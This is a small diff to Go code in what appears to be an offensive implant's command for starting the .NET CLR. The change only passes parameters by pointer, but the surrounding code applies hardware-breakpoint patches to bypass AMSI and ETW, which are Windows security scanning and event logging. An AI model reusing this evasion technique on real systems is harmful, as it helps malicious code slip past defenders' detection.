@@ -148,7 +148,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 
 	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
 	if needHWBP {
-		output += clrApplyHWBP(params, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName)
+		output += clrApplyHWBP(&params, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName)
 	}
 
 	// Summary
